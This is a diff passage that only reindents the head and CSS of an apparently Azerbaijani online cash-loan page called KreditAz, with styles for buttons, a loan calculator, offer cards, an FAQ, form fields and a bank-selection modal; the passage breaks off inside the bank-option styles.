@@ -1,1500 +1,1448 @@
 <!DOCTYPE html>
 <html lang="az">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>KreditAz — Onlayn nağd kredit</title>
-<link rel="preconnect" href="https://fonts.googleapis.com">
-<link href="https://fonts.googleapis.com/css2?family=Fraunces:opsz,wght@9..144,400;9..144,600;9..144,700&family=Manrope:wght@400;500;600;700;800&family=IBM+Plex+Mono:wght@400;500;600&display=swap" rel="stylesheet">
-<style>
-  :root{
-    --paper:#F4F1E8;
-    --ink:#151F1B;
-    --ink-soft:#57645C;
-    --teal-deep:#0B3A34;
-    --teal-mid:#155C51;
-    --gold:#AD7F3F;
-    --gold-light:#D4A84B;
-    --sage:#E3E9DF;
-    --line:#D8D0BC;
-    --white:#FFFFFF;
-    --shadow-sm:0 2px 8px -2px rgba(21,31,27,0.12);
-    --shadow-md:0 16px 32px -18px rgba(21,31,27,0.35);
-    --shadow-lg:0 28px 56px -24px rgba(21,31,27,0.4);
-  }
-  *{box-sizing:border-box;}
-  html{scroll-behavior:smooth;}
-  body{
-    margin:0;
-    background:var(--paper);
-    color:var(--ink);
-    font-family:'Manrope',sans-serif;
-    line-height:1.5;
-    font-size:16px;
-  }
-  h1,h2,h3{
-    font-family:'Fraunces',serif;
-    font-weight:600;
-    margin:0;
-    letter-spacing:-0.01em;
-  }
-  .mono{font-family:'IBM Plex Mono',monospace;}
-  a{color:inherit;text-decoration:none;}
-  .wrap{max-width:1080px;margin:0 auto;padding:0 24px;}
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>KreditAz — Onlayn nağd kredit</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link href="https://fonts.googleapis.com/css2?family=Fraunces:opsz,wght@9..144,400;9..144,600;9..144,700&family=Manrope:wght@400;500;600;700;800&family=IBM+Plex+Mono:wght@400;500;600&display=swap" rel="stylesheet">
+    <style>
+        :root{
+            --paper:#F4F1E8;
+            --ink:#151F1B;
+            --ink-soft:#57645C;
+            --teal-deep:#0B3A34;
+            --teal-mid:#155C51;
+            --gold:#AD7F3F;
+            --gold-light:#D4A84B;
+            --sage:#E3E9DF;
+            --line:#D8D0BC;
+            --white:#FFFFFF;
+            --shadow-sm:0 2px 8px -2px rgba(21,31,27,0.12);
+            --shadow-md:0 16px 32px -18px rgba(21,31,27,0.35);
+            --shadow-lg:0 28px 56px -24px rgba(21,31,27,0.4);
+        }
+        *{box-sizing:border-box;}
+        html{scroll-behavior:smooth;}
+        body{
+            margin:0;
+            background:var(--paper);
+            color:var(--ink);
+            font-family:'Manrope',sans-serif;
+            line-height:1.5;
+            font-size:16px;
+        }
+        h1,h2,h3{
+            font-family:'Fraunces',serif;
+            font-weight:600;
+            margin:0;
+            letter-spacing:-0.01em;
+        }
+        .mono{font-family:'IBM Plex Mono',monospace;}
+        a{color:inherit;text-decoration:none;}
+        .wrap{max-width:1080px;margin:0 auto;padding:0 24px;}
 
-  .kilim{
-    height:14px;
-    width:100%;
-    background-image: repeating-linear-gradient(135deg, var(--gold) 0 6px, transparent 6px 12px);
-    opacity:0.55;
-  }
-  .kilim.dark{background-image: repeating-linear-gradient(135deg, var(--sage) 0 6px, transparent 6px 12px); opacity:0.5;}
+        .kilim{
+            height:14px;
+            width:100%;
+            background-image: repeating-linear-gradient(135deg, var(--gold) 0 6px, transparent 6px 12px);
+            opacity:0.55;
+        }
+        .kilim.dark{background-image: repeating-linear-gradient(135deg, var(--sage) 0 6px, transparent 6px 12px); opacity:0.5;}
 
-  header{
-    position:sticky;top:0;z-index:50;
-    background:rgba(246,241,228,0.92);
-    backdrop-filter:blur(6px);
-    border-bottom:1px solid var(--line);
-  }
-  .nav{
-    display:flex;align-items:center;justify-content:space-between;
-    padding:14px 24px;max-width:1080px;margin:0 auto;
-    gap:12px;
-    flex-wrap:wrap;
-  }
-  .logo{
-    display:flex;
-    align-items:center;
-    gap:0;
-    font-family:'Fraunces',serif;
-    font-weight:700;
-    font-size:24px;
-  }
-  .logo .logo-icon{
-    width:36px;
-    height:36px;
-    background:linear-gradient(135deg, #0B3A34, #155C51);
-    border-radius:10px;
-    display:flex;
-    align-items:center;
-    justify-content:center;
-    font-size:16px;
-    color:var(--white);
-    font-weight:800;
-    margin-right:6px;
-  }
-  .logo .kredit{color:#155C51;}
-  .logo .az{color:#AD7F3F;}
-  
-  nav ul{list-style:none;display:flex;gap:24px;margin:0;padding:0;font-size:14px;font-weight:600;}
-  nav ul a{text-decoration:none;opacity:0.8;transition:opacity .2s;}
-  nav ul a:hover{opacity:1;}
+        header{
+            position:sticky;top:0;z-index:50;
+            background:rgba(246,241,228,0.92);
+            backdrop-filter:blur(6px);
+            border-bottom:1px solid var(--line);
+        }
+        .nav{
+            display:flex;align-items:center;justify-content:space-between;
+            padding:14px 24px;max-width:1080px;margin:0 auto;
+            gap:12px;
+            flex-wrap:wrap;
+        }
+        .logo{
+            display:flex;
+            align-items:center;
+            gap:0;
+            font-family:'Fraunces',serif;
+            font-weight:700;
+            font-size:24px;
+        }
+        .logo .logo-icon{
+            width:36px;
+            height:36px;
+            background:linear-gradient(135deg, #0B3A34, #155C51);
+            border-radius:10px;
+            display:flex;
+            align-items:center;
+            justify-content:center;
+            font-size:16px;
+            color:var(--white);
+            font-weight:800;
+            margin-right:6px;
+        }
+        .logo .kredit{color:#155C51;}
+        .logo .az{color:#AD7F3F;}
+        
+        nav ul{list-style:none;display:flex;gap:24px;margin:0;padding:0;font-size:14px;font-weight:600;}
+        nav ul a{text-decoration:none;opacity:0.8;transition:opacity .2s;}
+        nav ul a:hover{opacity:1;}
 
-  .cta-btn{
-    position:relative;
-    background:linear-gradient(135deg, #0B3A34, #155C51, #1A7A6A);
-    color:var(--white);
-    border:none;
-    border-radius:999px;
-    padding:14px 32px;
-    font-weight:700;
-    font-size:15px;
-    cursor:pointer;
-    letter-spacing:.02em;
-    font-family:'Manrope',sans-serif;
-    box-shadow:0 4px 20px rgba(21,92,81,0.3), inset 0 1px 0 rgba(255,255,255,0.15);
-    transition:all .3s cubic-bezier(0.4, 0, 0.2, 1);
-    overflow:hidden;
-    text-transform:uppercase;
-    white-space:nowrap;
-  }
-  .cta-btn::before{
-    content:'';
-    position:absolute;
-    top:-50%;
-    left:-50%;
-    width:200%;
-    height:200%;
-    background:linear-gradient(105deg,
-      transparent 30%,
-      rgba(255,255,255,0.2) 40%,
-      rgba(255,255,255,0.5) 48%,
-      rgba(255,255,255,0.8) 52%,
-      rgba(255,255,255,0.2) 60%,
-      transparent 70%
-    );
-    transform:rotate(25deg) translateX(-130%);
-    animation:shinySweep 3.5s infinite ease-in-out;
-    pointer-events:none;
-    filter:blur(2px);
-  }
-  @keyframes shinySweep{
-    0%{transform:rotate(25deg) translateX(-130%);}
-    60%{transform:rotate(25deg) translateX(130%);}
-    100%{transform:rotate(25deg) translateX(130%);}
-  }
-  .cta-btn::after{
-    content:'';
-    position:absolute;
-    inset:0;
-    border-radius:999px;
-    padding:2px;
-    background:linear-gradient(135deg, rgba(255,215,0,0.4), rgba(255,215,0,0.1), rgba(255,215,0,0.4));
-    -webkit-mask:linear-gradient(#fff 0 0) content-box, linear-gradient(#fff 0 0);
-    -webkit-mask-composite:xor;
-    mask-composite:exclude;
-    pointer-events:none;
-  }
-  .cta-btn:hover{
-    transform:translateY(-3px) scale(1.03);
-    box-shadow:0 12px 40px rgba(21,92,81,0.45), 0 0 60px rgba(173,127,63,0.2);
-  }
-  .cta-btn:active{
-    transform:translateY(0) scale(0.97);
-  }
+        .cta-btn{
+            position:relative;
+            background:linear-gradient(135deg, #0B3A34, #155C51, #1A7A6A);
+            color:var(--white);
+            border:none;
+            border-radius:999px;
+            padding:14px 32px;
+            font-weight:700;
+            font-size:15px;
+            cursor:pointer;
+            letter-spacing:.02em;
+            font-family:'Manrope',sans-serif;
+            box-shadow:0 4px 20px rgba(21,92,81,0.3), inset 0 1px 0 rgba(255,255,255,0.15);
+            transition:all .3s cubic-bezier(0.4, 0, 0.2, 1);
+            overflow:hidden;
+            text-transform:uppercase;
+            white-space:nowrap;
+        }
+        .cta-btn::before{
+            content:'';
+            position:absolute;
+            top:-50%;
+            left:-50%;
+            width:200%;
+            height:200%;
+            background:linear-gradient(105deg,
+                transparent 30%,
+                rgba(255,255,255,0.2) 40%,
+                rgba(255,255,255,0.5) 48%,
+                rgba(255,255,255,0.8) 52%,
+                rgba(255,255,255,0.2) 60%,
+                transparent 70%
+            );
+            transform:rotate(25deg) translateX(-130%);
+            animation:shinySweep 3.5s infinite ease-in-out;
+            pointer-events:none;
+            filter:blur(2px);
+        }
+        @keyframes shinySweep{
+            0%{transform:rotate(25deg) translateX(-130%);}
+            60%{transform:rotate(25deg) translateX(130%);}
+            100%{transform:rotate(25deg) translateX(130%);}
+        }
+        .cta-btn::after{
+            content:'';
+            position:absolute;
+            inset:0;
+            border-radius:999px;
+            padding:2px;
+            background:linear-gradient(135deg, rgba(255,215,0,0.4), rgba(255,215,0,0.1), rgba(255,215,0,0.4));
+            -webkit-mask:linear-gradient(#fff 0 0) content-box, linear-gradient(#fff 0 0);
+            -webkit-mask-composite:xor;
+            mask-composite:exclude;
+            pointer-events:none;
+        }
+        .cta-btn:hover{
+            transform:translateY(-3px) scale(1.03);
+            box-shadow:0 12px 40px rgba(21,92,81,0.45), 0 0 60px rgba(173,127,63,0.2);
+        }
+        .cta-btn:active{
+            transform:translateY(0) scale(0.97);
+        }
 
-  .cta-white{
-    position:relative;
-    background:var(--white);
-    color:var(--teal-deep);
-    border:none;
-    border-radius:999px;
-    padding:14px 32px;
-    font-weight:700;
-    font-size:15px;
-    cursor:pointer;
-    letter-spacing:.02em;
-    font-family:'Manrope',sans-serif;
-    box-shadow:0 4px 20px rgba(0,0,0,0.08);
-    transition:all .3s cubic-bezier(0.4, 0, 0.2, 1);
-    overflow:hidden;
-    text-transform:uppercase;
-    white-space:nowrap;
-  }
-  .cta-white::before{
-    content:'';
-    position:absolute;
-    top:-50%;
-    left:-50%;
-    width:200%;
-    height:200%;
-    background:linear-gradient(105deg,
-      transparent 30%,
-      rgba(173,127,63,0.08) 40%,
-      rgba(173,127,63,0.2) 48%,
-      rgba(173,127,63,0.08) 60%,
-      transparent 70%
-    );
-    transform:rotate(25deg) translateX(-130%);
-    animation:shinySweep 4s infinite ease-in-out;
-    pointer-events:none;
-    filter:blur(2px);
-  }
-  .cta-white:hover{
-    transform:translateY(-3px) scale(1.03);
-    box-shadow:0 12px 40px rgba(0,0,0,0.15);
-  }
+        .cta-white{
+            position:relative;
+            background:var(--white);
+            color:var(--teal-deep);
+            border:none;
+            border-radius:999px;
+            padding:14px 32px;
+            font-weight:700;
+            font-size:15px;
+            cursor:pointer;
+            letter-spacing:.02em;
+            font-family:'Manrope',sans-serif;
+            box-shadow:0 4px 20px rgba(0,0,0,0.08);
+            transition:all .3s cubic-bezier(0.4, 0, 0.2, 1);
+            overflow:hidden;
+            text-transform:uppercase;
+            white-space:nowrap;
+        }
+        .cta-white::before{
+            content:'';
+            position:absolute;
+            top:-50%;
+            left:-50%;
+            width:200%;
+            height:200%;
+            background:linear-gradient(105deg,
+                transparent 30%,
+                rgba(173,127,63,0.08) 40%,
+                rgba(173,127,63,0.2) 48%,
+                rgba(173,127,63,0.08) 60%,
+                transparent 70%
+            );
+            transform:rotate(25deg) translateX(-130%);
+            animation:shinySweep 4s infinite ease-in-out;
+            pointer-events:none;
+            filter:blur(2px);
+        }
+        .cta-white:hover{
+            transform:translateY(-3px) scale(1.03);
+            box-shadow:0 12px 40px rgba(0,0,0,0.15);
+        }
 
-  .cta-ghost{
-    position:relative;
-    background:transparent;
-    border:2px solid var(--teal-deep);
-    color:var(--teal-deep);
-    border-radius:999px;
-    padding:12px 28px;
-    font-weight:700;
-    font-size:15px;
-    cursor:pointer;
-    transition:all .3s cubic-bezier(0.4, 0, 0.2, 1);
-    overflow:hidden;
-    text-transform:uppercase;
-    letter-spacing:.02em;
-    white-space:nowrap;
-  }
-  .cta-ghost::before{
-    content:'';
-    position:absolute;
-    top:-50%;
-    left:-50%;
-    width:200%;
-    height:200%;
-    background:linear-gradient(105deg,
-      transparent 30%,
-      rgba(173,127,63,0.15) 40%,
-      rgba(173,127,63,0.3) 48%,
-      rgba(173,127,63,0.5) 52%,
-      rgba(173,127,63,0.15) 60%,
-      transparent 70%
-    );
-    transform:rotate(25deg) translateX(-130%);
-    animation:shinySweepGhost 4s infinite ease-in-out;
-    pointer-events:none;
-    filter:blur(2px);
-  }
-  @keyframes shinySweepGhost{
-    0%{transform:rotate(25deg) translateX(-130%);}
-    60%{transform:rotate(25deg) translateX(130%);}
-    100%{transform:rotate(25deg) translateX(130%);}
-  }
-  .cta-ghost:hover{
-    background:var(--teal-deep);
-    color:var(--white);
-    transform:translateY(-3px) scale(1.03);
-    box-shadow:0 12px 40px rgba(21,92,81,0.25);
-  }
+        .cta-ghost{
+            position:relative;
+            background:transparent;
+            border:2px solid var(--teal-deep);
+            color:var(--teal-deep);
+            border-radius:999px;
+            padding:12px 28px;
+            font-weight:700;
+            font-size:15px;
+            cursor:pointer;
+            transition:all .3s cubic-bezier(0.4, 0, 0.2, 1);
+            overflow:hidden;
+            text-transform:uppercase;
+            letter-spacing:.02em;
+            white-space:nowrap;
+        }
+        .cta-ghost::before{
+            content:'';
+            position:absolute;
+            top:-50%;
+            left:-50%;
+            width:200%;
+            height:200%;
+            background:linear-gradient(105deg,
+                transparent 30%,
+                rgba(173,127,63,0.15) 40%,
+                rgba(173,127,63,0.3) 48%,
+                rgba(173,127,63,0.5) 52%,
+                rgba(173,127,63,0.15) 60%,
+                transparent 70%
+            );
+            transform:rotate(25deg) translateX(-130%);
+            animation:shinySweepGhost 4s infinite ease-in-out;
+            pointer-events:none;
+            filter:blur(2px);
+        }
+        @keyframes shinySweepGhost{
+            0%{transform:rotate(25deg) translateX(-130%);}
+            60%{transform:rotate(25deg) translateX(130%);}
+            100%{transform:rotate(25deg) translateX(130%);}
+        }
+        .cta-ghost:hover{
+            background:var(--teal-deep);
+            color:var(--white);
+            transform:translateY(-3px) scale(1.03);
+            box-shadow:0 12px 40px rgba(21,92,81,0.25);
+        }
 
-  .hero{padding:80px 0 56px;}
-  .hero-grid{display:grid;grid-template-columns:1.1fr 0.9fr;gap:48px;align-items:center;}
-  .eyebrow{
-    font-family:'IBM Plex Mono',monospace;font-size:13px;letter-spacing:.08em;
-    text-transform:uppercase;color:var(--teal-mid);margin-bottom:14px;display:block;
-  }
-  .hero h1{font-size:clamp(34px,5vw,54px);line-height:1.05;}
-  .hero h1 em{font-style:normal;color:var(--teal-deep);border-bottom:4px solid var(--gold);}
-  .hero p{margin-top:20px;font-size:17.5px;color:var(--ink-soft);max-width:46ch;}
-  .hero-actions{display:flex;gap:14px;margin-top:30px;flex-wrap:wrap;}
-  .hero-card{
-    background:var(--white);border:1px solid var(--line);border-radius:20px;
-    padding:28px;box-shadow:var(--shadow-lg);
-    transition:transform .3s ease;
-  }
-  .hero-card .row{display:flex;justify-content:space-between;font-size:13.5px;color:var(--ink-soft);margin-bottom:6px;}
-  .hero-card .big-number{font-family:'IBM Plex Mono',monospace;font-size:30px;font-weight:600;color:var(--teal-deep);}
-  .hero-card hr{border:none;border-top:1px dashed var(--line);margin:16px 0;}
+        .hero{padding:80px 0 56px;}
+        .hero-grid{display:grid;grid-template-columns:1.1fr 0.9fr;gap:48px;align-items:center;}
+        .eyebrow{
+            font-family:'IBM Plex Mono',monospace;font-size:13px;letter-spacing:.08em;
+            text-transform:uppercase;color:var(--teal-mid);margin-bottom:14px;display:block;
+        }
+        .hero h1{font-size:clamp(34px,5vw,54px);line-height:1.05;}
+        .hero h1 em{font-style:normal;color:var(--teal-deep);border-bottom:4px solid var(--gold);}
+        .hero p{margin-top:20px;font-size:17.5px;color:var(--ink-soft);max-width:46ch;}
+        .hero-actions{display:flex;gap:14px;margin-top:30px;flex-wrap:wrap;}
+        .hero-card{
+            background:var(--white);border:1px solid var(--line);border-radius:20px;
+            padding:28px;box-shadow:var(--shadow-lg);
+            transition:transform .3s ease;
+        }
+        .hero-card .row{display:flex;justify-content:space-between;font-size:13.5px;color:var(--ink-soft);margin-bottom:6px;}
+        .hero-card .big-number{font-family:'IBM Plex Mono',monospace;font-size:30px;font-weight:600;color:var(--teal-deep);}
+        .hero-card hr{border:none;border-top:1px dashed var(--line);margin:16px 0;}
 
-  section{padding:64px 0;}
-  .section-head{max-width:60ch;margin-bottom:36px;}
-  .section-head .eyebrow{margin-bottom:10px;}
-  .section-head h2{font-size:clamp(26px,3.2vw,36px);}
-  .section-head p{color:var(--ink-soft);margin-top:12px;font-size:16px;}
+        section{padding:64px 0;}
+        .section-head{max-width:60ch;margin-bottom:36px;}
+        .section-head .eyebrow{margin-bottom:10px;}
+        .section-head h2{font-size:clamp(26px,3.2vw,36px);}
+        .section-head p{color:var(--ink-soft);margin-top:12px;font-size:16px;}
 
-  .calc-card{
-    background:var(--white);border:1px solid var(--line);border-radius:20px;
-    padding:36px;display:grid;grid-template-columns:1.1fr 0.9fr;gap:40px;
-    box-shadow:var(--shadow-md);
-  }
-  .slider-block{margin-bottom:30px;}
-  .slider-block label{display:flex;justify-content:space-between;font-weight:700;font-size:15px;margin-bottom:10px;}
-  .slider-value{font-family:'IBM Plex Mono',monospace;color:var(--teal-deep);font-size:17px;}
-  input[type=range]{
-    -webkit-appearance:none;width:100%;height:6px;border-radius:4px;
-    background:linear-gradient(to right, var(--teal-mid) 0%, var(--teal-mid) var(--fill,50%), var(--sage) var(--fill,50%), var(--sage) 100%);
-  }
-  input[type=range]::-webkit-slider-thumb{
-    -webkit-appearance:none;width:22px;height:22px;border-radius:50%;
-    background:var(--white);border:4px solid var(--teal-deep);cursor:pointer;
-    box-shadow:var(--shadow-sm);transition:transform .15s ease;
-  }
-  input[type=range]::-webkit-slider-thumb:hover{transform:scale(1.1);}
-  .range-labels{display:flex;justify-content:space-between;font-size:12.5px;color:var(--ink-soft);margin-top:8px;font-family:'IBM Plex Mono',monospace;}
+        .calc-card{
+            background:var(--white);border:1px solid var(--line);border-radius:20px;
+            padding:36px;display:grid;grid-template-columns:1.1fr 0.9fr;gap:40px;
+            box-shadow:var(--shadow-md);
+        }
+        .slider-block{margin-bottom:30px;}
+        .slider-block label{display:flex;justify-content:space-between;font-weight:700;font-size:15px;margin-bottom:10px;}
+        .slider-value{font-family:'IBM Plex Mono',monospace;color:var(--teal-deep);font-size:17px;}
+        input[type=range]{
+            -webkit-appearance:none;width:100%;height:6px;border-radius:4px;
+            background:linear-gradient(to right, var(--teal-mid) 0%, var(--teal-mid) var(--fill,50%), var(--sage) var(--fill,50%), var(--sage) 100%);
+        }
+        input[type=range]::-webkit-slider-thumb{
+            -webkit-appearance:none;width:22px;height:22px;border-radius:50%;
+            background:var(--white);border:4px solid var(--teal-deep);cursor:pointer;
+            box-shadow:var(--shadow-sm);transition:transform .15s ease;
+        }
+        input[type=range]::-webkit-slider-thumb:hover{transform:scale(1.1);}
+        .range-labels{display:flex;justify-content:space-between;font-size:12.5px;color:var(--ink-soft);margin-top:8px;font-family:'IBM Plex Mono',monospace;}
 
-  .results{
-    background:var(--teal-deep);color:var(--white);border-radius:16px;padding:26px;
-  }
-  .results .pair{display:flex;justify-content:space-between;padding:10px 0;border-bottom:1px solid rgba(255,255,255,0.15);font-size:14.5px;}
-  .results .pair:last-child{border-bottom:none;}
-  .results .headline-pair{display:flex;justify-content:space-between;align-items:baseline;margin-bottom:18px;}
-  .results .headline-pair .num{font-family:'IBM Plex Mono',monospace;font-size:32px;font-weight:600;color:#E8C688;}
-  .results .headline-pair .lbl{font-size:13.5px;opacity:0.85;}
+        .results{
+            background:var(--teal-deep);color:var(--white);border-radius:16px;padding:26px;
+        }
+        .results .pair{display:flex;justify-content:space-between;padding:10px 0;border-bottom:1px solid rgba(255,255,255,0.15);font-size:14.5px;}
+        .results .pair:last-child{border-bottom:none;}
+        .results .headline-pair{display:flex;justify-content:space-between;align-items:baseline;margin-bottom:18px;}
+        .results .headline-pair .num{font-family:'IBM Plex Mono',monospace;font-size:32px;font-weight:600;color:#E8C688;}
+        .results .headline-pair .lbl{font-size:13.5px;opacity:0.85;}
 
-  .offers-grid{display:grid;grid-template-columns:1fr 1fr;gap:24px;}
-  .offer-card{
-    background:var(--white);border:1px solid var(--line);border-radius:18px;padding:28px;
-    position:relative;overflow:hidden;box-shadow:var(--shadow-sm);
-    transition:transform .25s ease, box-shadow .25s ease;
-  }
-  .offer-card:hover{transform:translateY(-4px);box-shadow:var(--shadow-md);}
-  .offer-card.vip{background:var(--teal-deep);color:var(--white);}
-  .offer-card .tag{
-    font-family:'IBM Plex Mono',monospace;font-size:12px;letter-spacing:.06em;
-    text-transform:uppercase;color:var(--gold);margin-bottom:10px;display:block;
-  }
-  .offer-card h3{font-size:24px;margin-bottom:6px;}
-  .offer-card .amount{font-family:'IBM Plex Mono',monospace;font-size:19px;margin-bottom:18px;}
-  .offer-card ul{list-style:none;padding:0;margin:0;font-size:14.5px;}
-  .offer-card ul li{display:flex;justify-content:space-between;padding:8px 0;border-bottom:1px dashed var(--line);}
-  .offer-card.vip ul li{border-bottom:1px dashed rgba(255,255,255,0.25);}
+        .offers-grid{display:grid;grid-template-columns:1fr 1fr;gap:24px;}
+        .offer-card{
+            background:var(--white);border:1px solid var(--line);border-radius:18px;padding:28px;
+            position:relative;overflow:hidden;box-shadow:var(--shadow-sm);
+            transition:transform .25s ease, box-shadow .25s ease;
+        }
+        .offer-card:hover{transform:translateY(-4px);box-shadow:var(--shadow-md);}
+        .offer-card.vip{background:var(--teal-deep);color:var(--white);}
+        .offer-card .tag{
+            font-family:'IBM Plex Mono',monospace;font-size:12px;letter-spacing:.06em;
+            text-transform:uppercase;color:var(--gold);margin-bottom:10px;display:block;
+        }
+        .offer-card h3{font-size:24px;margin-bottom:6px;}
+        .offer-card .amount{font-family:'IBM Plex Mono',monospace;font-size:19px;margin-bottom:18px;}
+        .offer-card ul{list-style:none;padding:0;margin:0;font-size:14.5px;}
+        .offer-card ul li{display:flex;justify-content:space-between;padding:8px 0;border-bottom:1px dashed var(--line);}
+        .offer-card.vip ul li{border-bottom:1px dashed rgba(255,255,255,0.25);}
 
-  .steps{display:grid;grid-template-columns:repeat(3,1fr);gap:24px;}
-  .step{border-left:2px solid var(--gold);padding-left:18px;}
-  .step .num{font-family:'IBM Plex Mono',monospace;color:var(--teal-mid);font-size:14px;}
-  .step h3{font-size:19px;margin:8px 0 8px;}
-  .step p{color:var(--ink-soft);font-size:15px;margin:0;}
+        .steps{display:grid;grid-template-columns:repeat(3,1fr);gap:24px;}
+        .step{border-left:2px solid var(--gold);padding-left:18px;}
+        .step .num{font-family:'IBM Plex Mono',monospace;color:var(--teal-mid);font-size:14px;}
+        .step h3{font-size:19px;margin:8px 0 8px;}
+        .step p{color:var(--ink-soft);font-size:15px;margin:0;}
 
-  .faq-item{border-bottom:1px solid var(--line);}
-  .faq-q{
-    width:100%;text-align:left;background:none;border:none;cursor:pointer;
-    padding:20px 4px;font-size:16.5px;font-weight:700;font-family:'Manrope',sans-serif;
-    display:flex;justify-content:space-between;align-items:center;color:var(--ink);
-  }
-  .faq-q .icon{font-family:'IBM Plex Mono',monospace;color:var(--teal-mid);font-size:20px;transition:transform .25s ease;}
-  .faq-item.open .faq-q .icon{transform:rotate(45deg);}
-  .faq-a{max-height:0;overflow:hidden;transition:max-height .35s ease;font-size:15px;color:var(--ink-soft);}
-  .faq-a p{margin:0 0 18px;padding-right:20px;}
-  .faq-item.open .faq-a{max-height:300px;}
+        .faq-item{border-bottom:1px solid var(--line);}
+        .faq-q{
+            width:100%;text-align:left;background:none;border:none;cursor:pointer;
+            padding:20px 4px;font-size:16.5px;font-weight:700;font-family:'Manrope',sans-serif;
+            display:flex;justify-content:space-between;align-items:center;color:var(--ink);
+        }
+        .faq-q .icon{font-family:'IBM Plex Mono',monospace;color:var(--teal-mid);font-size:20px;transition:transform .25s ease;}
+        .faq-item.open .faq-q .icon{transform:rotate(45deg);}
+        .faq-a{max-height:0;overflow:hidden;transition:max-height .35s ease;font-size:15px;color:var(--ink-soft);}
+        .faq-a p{margin:0 0 18px;padding-right:20px;}
+        .faq-item.open .faq-a{max-height:300px;}
 
-  .field{margin-bottom:20px;}
-  .field label{display:block;font-weight:700;font-size:14.5px;margin-bottom:8px;}
-  .field input, .field select{
-    width:100%;padding:13px 14px;border:1.5px solid var(--line);border-radius:10px;
-    font-family:'Manrope',sans-serif;font-size:15px;background:var(--paper);
-    transition:border-color .18s ease, box-shadow .18s ease;
-  }
-  .field input:focus, .field select:focus{
-    border-color:var(--teal-mid);box-shadow:0 0 0 3px rgba(21,92,81,0.15);outline:none;
-  }
-  .toggle-row{display:flex;gap:12px;}
-  .toggle-btn{
-    flex:1;padding:13px;border-radius:10px;border:1.5px solid var(--line);
-    background:var(--white);cursor:pointer;font-weight:700;font-size:14.5px;
-    transition:background .18s ease, color .18s ease, border-color .18s ease;
-  }
-  .toggle-btn.active{background:var(--teal-deep);color:var(--white);border-color:var(--teal-deep);}
-  .checkline{display:flex;gap:10px;align-items:flex-start;margin-bottom:14px;font-size:13.5px;color:var(--ink-soft);}
-  .checkline input{margin-top:3px;width:18px;height:18px;cursor:pointer;}
-  .disclaimer-box{
-    background:var(--sage);border-radius:12px;padding:16px 18px;font-size:13px;color:var(--ink-soft);
-    margin-top:6px;margin-bottom:20px;
-  }
-  .form-status{margin-top:16px;font-size:14px;font-weight:700;color:var(--teal-deep);display:none;}
+        .field{margin-bottom:20px;}
+        .field label{display:block;font-weight:700;font-size:14.5px;margin-bottom:8px;}
+        .field input, .field select{
+            width:100%;padding:13px 14px;border:1.5px solid var(--line);border-radius:10px;
+            font-family:'Manrope',sans-serif;font-size:15px;background:var(--paper);
+            transition:border-color .18s ease, box-shadow .18s ease;
+        }
+        .field input:focus, .field select:focus{
+            border-color:var(--teal-mid);box-shadow:0 0 0 3px rgba(21,92,81,0.15);outline:none;
+        }
+        .toggle-row{display:flex;gap:12px;}
+        .toggle-btn{
+            flex:1;padding:13px;border-radius:10px;border:1.5px solid var(--line);
+            background:var(--white);cursor:pointer;font-weight:700;font-size:14.5px;
+            transition:background .18s ease, color .18s ease, border-color .18s ease;
+        }
+        .toggle-btn.active{background:var(--teal-deep);color:var(--white);border-color:var(--teal-deep);}
+        .checkline{display:flex;gap:10px;align-items:flex-start;margin-bottom:14px;font-size:13.5px;color:var(--ink-soft);}
+        .checkline input{margin-top:3px;width:18px;height:18px;cursor:pointer;}
+        .disclaimer-box{
+            background:var(--sage);border-radius:12px;padding:16px 18px;font-size:13px;color:var(--ink-soft);
+            margin-top:6px;margin-bottom:20px;
+        }
+        .form-status{margin-top:16px;font-size:14px;font-weight:700;color:var(--teal-deep);display:none;}
 
-  .modal-overlay{
-    position:fixed;inset:0;background:rgba(11,20,17,0.65);
-    display:none;align-items:flex-start;justify-content:center;
-    z-index:200;padding:40px 20px;overflow-y:auto;
-  }
-  .modal-overlay.active{display:flex;}
-  .modal-card{
-    background:var(--white);border-radius:20px;padding:36px;max-width:680px;width:100%;
-    position:relative;box-shadow:var(--shadow-lg);
-    animation:modalIn .22s ease;
-  }
-  @keyframes modalIn{from{opacity:0;transform:translateY(12px);}to{opacity:1;transform:translateY(0);}}
-  .modal-close{
-    position:absolute;top:18px;right:18px;background:var(--sage);border:none;
-    width:36px;height:36px;border-radius:50%;cursor:pointer;font-size:16px;font-weight:700;
-    transition:background .18s ease;
-  }
-  .modal-close:hover{background:var(--line);}
+        .modal-overlay{
+            position:fixed;inset:0;background:rgba(11,20,17,0.65);
+            display:none;align-items:flex-start;justify-content:center;
+            z-index:200;padding:40px 20px;overflow-y:auto;
+        }
+        .modal-overlay.active{display:flex;}
+        .modal-card{
+            background:var(--white);border-radius:20px;padding:36px;max-width:680px;width:100%;
+            position:relative;box-shadow:var(--shadow-lg);
+            animation:modalIn .22s ease;
+        }
+        @keyframes modalIn{from{opacity:0;transform:translateY(12px);}to{opacity:1;transform:translateY(0);}}
+        .modal-close{
+            position:absolute;top:18px;right:18px;background:var(--sage);border:none;
+            width:36px;height:36px;border-radius:50%;cursor:pointer;font-size:16px;font-weight:700;
+            transition:background .18s ease;
+        }
+        .modal-close:hover{background:var(--line);}
 
-  .bank-grid{
-    display:grid;grid-template-columns:1fr 1fr;gap:12px;
-  }
-  .bank-option{
-    padding:14px 12px;border:2px solid var(--line);border-radius:14px;
-    cursor:pointer;text-align:center;transition:all .25s ease;
-    background:var(--white);
-    position:relative;
-  }
-  .bank-option:hover{
-    border-color:var(--teal-mid);
-    transform:translateY(-3px);
-    box-shadow:var(--shadow-sm);
-  }
-  .bank-option.selected{
-    border-color:var(--teal-deep);
-    background:var(--sage);
-    box-shadow:0 0 30px rgba(173,127,63,0.15);
-  }
-  .bank-option.selected::after{
-    content:'✓';
-    position:absolute;
-    top:-8px;right:-8px;
-    background:var(--teal-deep);
-    color:white;
-    width:24px;height:24px;
-    border-radius:50%;
-    font-size:13px;
-    display:flex;
-    align-items:center;
-    justify-content:center;
-  }
-  .bank-option .bank-logo-img{
-    height:38px;
-    max-width:130px;
-    object-fit:contain;
-    margin-bottom:4px;
-    display:block;
-    margin-left:auto;
-    margin-right:auto;
-  }
-  .bank-option .bank-name{font-size:13px;font-weight:600;margin-top:2px;}
-  .bank-option .bank-sub{font-size:10px;color:var(--ink-soft);}
+        .bank-grid{
+            display:grid;grid-template-columns:1fr 1fr;gap:12px;
+        }
+        .bank-option{
+            padding:14px 12px;border:2px solid var(--line);border-radius:14px;
